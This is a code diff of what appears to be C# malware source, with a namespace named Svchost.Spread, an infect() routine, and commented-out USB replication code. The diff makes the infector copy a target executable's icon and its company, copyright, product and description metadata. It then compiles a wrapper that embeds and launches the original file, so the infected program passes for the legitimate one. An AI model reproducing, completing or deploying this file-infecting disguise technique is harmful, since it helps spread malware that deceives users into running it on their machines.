@@ -9,6 +9,8 @@ using System.Windows.Forms;
 using System.Reflection;
 using System.Drawing.IconLib;
 using Microsoft.CSharp;
+using TsudaKageyu;
+using System.CodeDom;
 
 namespace Svchost.Spread
 {
@@ -39,7 +41,7 @@ namespace Svchost.Spread
             if (checkEnvironment())
                 driveDetector = new DriveDetector(applicationPath + assemblyName, replicateOverUSB);*/
 
-            infect();
+            infect(applicationPath);
         }
 
         private bool isExecutableInfected(string path)
@@ -64,11 +66,14 @@ namespace Svchost.Spread
         {
             try
             {
-                Icon icon = Icon.ExtractAssociatedIcon(path);
+                IconExtractor ie = new IconExtractor(path);
+                Icon icon = ie.GetIcon(0);
                 MultiIcon mIcon = new MultiIcon();
                 SingleIcon sIcon = mIcon.Add("oink");
-                sIcon.CreateFrom(icon.ToBitmap(), IconOutputFormat.Vista);
-                sIcon.Save(@"D:\DevMain\bdo\SvchostTest\Svchost\bin\Debug\icon6.ico");
+                Icon[] splitIcons = IconUtil.Split(icon);
+                sIcon.CreateFrom(IconUtil.ToBitmap(splitIcons[splitIcons.Length - 1]), IconOutputFormat.Vista);
+                sIcon.Save(@"icon12.ico");
+                
                 /* FileStream fs = new FileStream(@"icon.ico", FileMode.Create);
                  icon.Save(fs);
                  fs.Close();*/
@@ -150,25 +155,44 @@ namespace Svchost.Spread
         }
 
         static CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider();
+        static CodeCompileUnit unit = new CodeCompileUnit();
         static CompilerParameters compilerParameters = new CompilerParameters
         {
             GenerateExecutable = true,
-            OutputAssembly = "compiledTest3.exe"
+            OutputAssembly = "icontext3.exe"
         };
 
-        void infect()
+        void infect(string appPath)
         {
             exctractIcon(@"test.exe");
 
             compilerParameters.ReferencedAssemblies.Add("System.dll");
-            compilerParameters.EmbeddedResources.Add("test.exe");
-            compilerParameters.CompilerOptions = @"/win32icon:D:\DevMain\bdo\SvchostTest\Svchost\bin\Debug\icon6.ico";
+            compilerParameters.EmbeddedResources.Add("./test.exe");
+            compilerParameters.CompilerOptions = @"/win32icon:" + appPath + "icon12.ico";
+
+            FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo("test.exe");
+            CodeTypeReference versionAttr = new CodeTypeReference(typeof(AssemblyVersionAttribute));
+            CodeAttributeDeclaration versionDecl = new CodeAttributeDeclaration(versionAttr, new CodeAttributeArgument(new CodePrimitiveExpression("1.0.2.42")));
+            CodeTypeReference companyAttr = new CodeTypeReference(typeof(AssemblyCompanyAttribute));
+            CodeAttributeDeclaration companyDecl = new CodeAttributeDeclaration(companyAttr, new CodeAttributeArgument(new CodePrimitiveExpression(versionInfo.CompanyName)));
+            CodeTypeReference copyrightAttr = new CodeTypeReference(typeof(AssemblyCopyrightAttribute));
+            CodeAttributeDeclaration copyrightDecl = new CodeAttributeDeclaration(copyrightAttr, new CodeAttributeArgument(new CodePrimitiveExpression(versionInfo.LegalCopyright)));
+            CodeTypeReference descriptionAttr = new CodeTypeReference(typeof(AssemblyDescriptionAttribute));
+            CodeAttributeDeclaration descriptionDecl = new CodeAttributeDeclaration(descriptionAttr, new CodeAttributeArgument(new CodePrimitiveExpression(versionInfo.FileDescription)));
+            CodeTypeReference productNameAttr = new CodeTypeReference(typeof(AssemblyProductAttribute));
+            CodeAttributeDeclaration productNameDecl = new CodeAttributeDeclaration(productNameAttr, new CodeAttributeArgument(new CodePrimitiveExpression(versionInfo.ProductName)));
+            
+            unit.AssemblyCustomAttributes.Add(versionDecl);
+            unit.AssemblyCustomAttributes.Add(companyDecl);
+            unit.AssemblyCustomAttributes.Add(copyrightDecl);
+            unit.AssemblyCustomAttributes.Add(descriptionDecl);
+            unit.AssemblyCustomAttributes.Add(productNameDecl);
 
             string cSharpCode = "public class Robot" +
             "{" +
             "   static void Main()" +
             "   {" +
-            "       ExtractResource( \"Svchost.Spread.test.exe\", \"test.exe\" );" +
+            "       ExtractResource( \"./test.exe\", \"test.exe\" );" +
             "       System.Diagnostics.Process.Start(\"test.exe\");" +
             "   }" +
 
@@ -181,9 +205,12 @@ namespace Svchost.Spread
             "   }" +
             "}";
 
-
+            StringWriter sw = new StringWriter();
+            cSharpCodeProvider.GenerateCodeFromCompileUnit(unit, sw, new CodeGeneratorOptions());
+            sw.Write(cSharpCode);
+            string s = sw.ToString();
             CompilerResults results = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters,
-            new[] { cSharpCode });
+            new[] { sw.ToString() });
 
             foreach (string output in results.Output)
             {
